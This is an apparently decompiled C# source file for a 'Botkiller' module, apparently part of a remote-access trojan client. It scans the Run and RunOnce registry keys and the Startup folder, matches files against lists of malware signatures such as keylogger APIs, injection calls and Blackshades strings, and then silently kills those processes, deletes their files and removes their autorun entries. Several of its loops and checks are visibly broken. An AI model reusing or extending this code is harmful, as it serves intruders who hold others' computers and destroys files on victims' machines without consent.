using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace xClient.Core;

public class Botkiller
{
	public struct PossibleThreat
	{
		public string fullpath;

		public bool running;

		public JudgedAs btype;

		public string regkey;

		public string exename;
	}

	public enum JudgedAs
	{
		Unknown = 17,
		Keylogger,
		GenericBot,
		Injector,
		IRC_Bot
	}

	public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static string temp = Environment.GetEnvironmentVariable("temp");

	public static string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

	public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string users = Environment.GetEnvironmentVariable("userprofile");

	public static char split1 = '\u0005';

	public static char split2 = '\u0006';

	private static string[] keylogger = new string[4] { "SetWindowsHookEx", "GetForegroundWindow", "GetWindowText", "GetAsyncKeyState" };

	private static string[] injector = new string[5] { "SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx", "GetExecutingAssembly", "System.Reflection" };

	private static string[] ircbot = new string[4] { "PRIVMSG", "JOIN", "USER", "NICK" };

	private static string[] generic = new string[16]
	{
		"WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET",
		"VirtualAlloc", "VirtualProtect", "BuilderSettings", "Nuclear Explosion.exe", "XUntHTTPFlood", "0UntPasswordAndData"
	};

	private static string[] crypter = new string[2] { "MD5CryptoServiceProvider", "RijndaelManaged" };

	private static List<PossibleThreat> lobj = new List<PossibleThreat>();

	public static void ScanThread()
	{
		Thread thread = new Thread(scan);
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		GC.Collect();
	}

	public static void scan()
	{
		try
		{
			lobj.Clear();
			List<string> list = new List<string>();
			foreach (string item in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				list.Add(item);
			}
			foreach (string item2 in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				list.Add(item2);
			}
			foreach (string item3 in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				list.Add(item3);
			}
			foreach (string item4 in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				list.Add(item4);
			}
			foreach (string item5 in returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				list.Add(item5);
			}
			foreach (string item6 in list)
			{
				try
				{
					if (usepath(item6.Split(new char[1] { split1 })[0]))
					{
						lobj.Add(scanFile(item6));
					}
				}
				catch
				{
				}
			}
			for (int i = 0; i == lobj.Count - 1; i++)
			{
				removeThreat(i);
			}
		}
		catch
		{
		}
		BotKillStatus.status = "done";
	}

	public static PossibleThreat scanFile(string path)
	{
		try
		{
			if (File.Exists(path.Split(new char[1] { split1 })[0]))
			{
				PossibleThreat result = default(PossibleThreat);
				result.fullpath = path.Split(new char[1] { split1 })[0];
				result.regkey = path.Split(new char[1] { split1 })[1];
				result.running = isRunning(path);
				result.exename = Path.GetFileName(result.fullpath);
				result.btype = JudgedAs.Unknown;
				if (result.fullpath == Application.get_ExecutablePath())
				{
					return default(PossibleThreat);
				}
				string text = Encoding.UTF8.GetString(File.ReadAllBytes(result.fullpath)).Trim(new char[1]);
				if (text != null)
				{
					string[] array = generic;
					foreach (string value in array)
					{
						if (text.Contains(value))
						{
							result.btype = JudgedAs.GenericBot;
						}
					}
					array = keylogger;
					foreach (string value2 in array)
					{
						if (text.Contains(value2))
						{
							result.btype = JudgedAs.Keylogger;
						}
					}
					array = injector;
					foreach (string value3 in array)
					{
						if (text.Contains(value3))
						{
							result.btype = JudgedAs.Injector;
						}
					}
					array = ircbot;
					foreach (string value4 in array)
					{
						if (text.Contains(value4))
						{
							result.btype = JudgedAs.IRC_Bot;
						}
					}
					return result;
				}
				return default(PossibleThreat);
			}
			return default(PossibleThreat);
		}
		catch
		{
			return default(PossibleThreat);
		}
	}

	private static void removeThreat(int lid)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule!.FileName == lobj[lid].fullpath)
					{
						process.Kill();
						Thread.Sleep(1000);
					}
				}
				catch
				{
				}
			}
			File.Delete(lobj[lid].fullpath);
			Thread.Sleep(1000);
			if (lobj[lid].regkey != "" || lobj[lid].regkey != null)
			{
				string text = lobj[lid].regkey.Split(new char[1] { '\\' })[0];
				if (!(text == "HKEY_CURRENT_USER"))
				{
					if (text == "HKEY_LOCAL_MACHINE")
					{
						string text2 = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
						string name = text2.Substring(0, text2.LastIndexOf('\\'));
						string name2 = text2.Remove(0, text2.LastIndexOf('\\') + 1);
						Microsoft.Win32.Registry.LocalMachine.OpenSubKey(name, writable: true)!.DeleteValue(name2);
					}
				}
				else
				{
					string text3 = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
					string name3 = text3.Substring(0, text3.LastIndexOf('\\'));
					string name4 = text3.Remove(0, text3.LastIndexOf('\\') + 1);
					Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name3, writable: true)!.DeleteValue(name4);
				}
			}
			Thread.Sleep(1000);
		}
		catch
		{
		}
	}

	private static bool usepath(string path)
	{
		if (path.Contains(users))
		{
			return true;
		}
		return false;
	}

	private static List<string> returnHKCU(string key)
	{
		List<string> list = new List<string>();
		string[] valueNames = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, writable: false)!.GetValueNames();
		foreach (string text in valueNames)
		{
			string text2 = (string)Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, writable: false)!.GetValue(text);
			if (text2.Contains("\""))
			{
				text2 = text2.Split(new char[1] { '"' })[1];
			}
			if (text2.Contains("-"))
			{
				text2 = text2.Split(new char[1] { '-' })[0];
			}
			if (text2.Contains("/"))
			{
				text2 = text2.Split(new char[1] { '/' })[0];
			}
			if (text2.Contains(".exe") || text2.Contains(".dll") || text2.Contains(".bat") || text2.Contains(".vbs") || text2.Contains(".scr"))
			{
				list.Add(text2 + split1 + "HKEY_CURRENT_USER\\" + key + "\\" + text);
			}
		}
		return list;
	}

	private static List<string> returnHKLM(string key)
	{
		List<string> list = new List<string>();
		string[] valueNames = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, writable: false)!.GetValueNames();
		foreach (string text in valueNames)
		{
			string text2 = (string)Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, writable: false)!.GetValue(text);
			if (text2.Contains("\""))
			{
				text2 = text2.Split(new char[1] { '"' })[1];
			}
			if (text2.Contains("-"))
			{
				text2 = text2.Split(new char[1] { '-' })[0];
			}
			if (text2.Contains("/"))
			{
				text2 = text2.Split(new char[1] { '/' })[0];
			}
			if (text2.Contains(".exe") || text2.Contains(".dll") || text2.Contains(".bat") || text2.Contains(".vbs") || text2.Contains(".scr"))
			{
				list.Add(text2 + split1 + "HKEY_LOCAL_MACHINE\\" + key + "\\" + text);
			}
		}
		return list;
	}

	private static List<string> returnDirs(string path)
	{
		List<string> list = new List<string>();
		FileInfo[] files = new DirectoryInfo(path).GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			if (fileInfo.FullName.Contains(".exe") || fileInfo.FullName.Contains(".dll") || fileInfo.FullName.Contains(".bat") || fileInfo.FullName.Contains(".vbs") || fileInfo.FullName.Contains(".scr"))
			{
				list.Add(fileInfo.FullName + split1 + fileInfo.FullName);
			}
		}
		return list;
	}

	private static bool isRunning(string fullpath)
	{
		bool result = false;
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (num < processes.Length)
			{
				if (processes[num].MainModule!.FileName == fullpath)
				{
					result = true;
					return result;
				}
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}
}
